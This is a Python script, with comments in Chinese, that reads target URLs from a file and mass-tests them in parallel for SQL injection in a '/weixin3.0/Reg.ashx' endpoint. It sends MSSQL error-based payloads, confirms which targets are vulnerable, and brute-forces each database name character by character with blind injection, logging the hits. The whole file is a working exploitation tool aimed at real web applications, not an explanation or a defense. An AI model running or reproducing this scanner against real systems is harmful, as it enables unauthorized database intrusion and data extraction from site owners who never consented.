import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

file_lock = threading.Lock()

def get_current_database(url):
    """
    获取当前数据库名称
    """
    try:
        target_url = urljoin(url.rstrip('/'), '/weixin3.0/Reg.ashx')
        
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'Content-Length': '23',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # 获取数据库名称的payload
        payloads = [
            "hum=1' AND DB_NAME()>0 --",
            "hum=1' AND 1=CONVERT(int,DB_NAME()) --"
        ]
        
        for payload in payloads:
            response = requests.post(
                target_url,
                headers=headers,
                data=payload,
                verify=False,
                allow_redirects=False,
                timeout=10
            )
            
            if response.status_code == 200 and 'Microsoft SQL Server' in response.text:
                # 尝试从错误信息中提取数据库名称
                if 'Conversion failed' in response.text or 'DB_NAME' in response.text:
                    return "数据库名称可获取（需进一步解析）"
        
        return "未知"
        
    except Exception as e:
        return f"获取失败: {str(e)}"

def brute_force_database_name(url):
    try:
        target_url = urljoin(url.rstrip('/'), '/weixin3.0/Reg.ashx')
        
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        db_name = ""
        
        # 首先获取数据库名称长度
        for length in range(1, 50):
            payload = f"hum=1' AND LEN(DB_NAME())={length} --"
            headers['Content-Length'] = str(len(payload))
            
            response = requests.post(
                target_url,
                headers=headers,
                data=payload,
                verify=False,
                allow_redirects=False,
                timeout=10
            )
            
            if response.status_code == 200 and 'Microsoft SQL Server' in response.text:
                db_length = length
                print(f"[INFO] 数据库名称长度: {db_length}")
                break
        else:
            return "无法获取数据库长度"
        
        # 逐字符爆破
        for position in range(1, db_length + 1):
            for char_code in range(32, 127):  # 可打印ASCII字符
                payload = f"hum=1' AND ASCII(SUBSTRING(DB_NAME(),{position},1))={char_code} --"
                headers['Content-Length'] = str(len(payload))
                
                response = requests.post(
                    target_url,
                    headers=headers,
                    data=payload,
                    verify=False,
                    allow_redirects=False,
                    timeout=10
                )
                
                if response.status_code == 200 and 'Microsoft SQL Server' in response.text:
                    db_name += chr(char_code)
                    print(f"[INFO] 位置 {position}: {chr(char_code)} - 当前: {db_name}")
                    break
            else:
                db_name += "?"
                print(f"[WARNING] 位置 {position}: 无法识别字符")
        
        return db_name
        
    except Exception as e:
        return f"爆破失败: {str(e)}"

def check_vulnerability(url):
    try:
        target_url = urljoin(url.rstrip('/'), '/weixin3.0/Reg.ashx')
        
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'Content-Length': '23',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        data = "hum=1'and 1<@@VERSION--"
        
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return False, url, response.status_code, None, None
        
        elif response.status_code == 200:
            if 'Microsoft SQL Server' in response.text:
                print(f"[VULNERABLE] {url} - 存在SQL注入漏洞")
                
                # 尝试获取当前数据库名称
                print(f"[INFO] 尝试获取数据库信息...")
                db_info = get_current_database(url)
                db_name = brute_force_database_name(url)
                
                return True, url, response.status_code, response.text, db_info
            else:
                print(f"[INFO] {url} - 状态码 200，但未找到特征字符串，不存在漏洞")
                return False, url, response.status_code, None, None
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return False, url, response.status_code, None, None
            
    except Exception as e:
        print(f"[ERROR] {url} - 发生异常: {str(e)}")
        return False, url, None, str(e), None

def write_result(vuln_info):
    """
    将漏洞详情写入result.txt
    """
    is_vulnerable, url, status_code, response_text, db_info = vuln_info
    
    if is_vulnerable:
        with file_lock:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"=" * 60 + "\n")
                f.write(f"存在漏洞的URL: {url}\n")
                f.write(f"状态码: {status_code}\n")
                f.write(f"数据库信息: {db_info}\n")
                f.write(f"响应内容:\n{response_text[:1000]}\n")
                f.write(f"=" * 60 + "\n\n")

def main():

    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有有效的URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL，开始检测...")
    
    open('result.txt', 'w', encoding='utf-8').close()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result[0]:
                    write_result(result)
            except Exception as e:
                print(f"[ERROR] {url} - 任务执行异常: {str(e)}")
    
    print(f"[INFO] 检测完成，结果已保存到result.txt")

if __name__ == "__main__":
    main()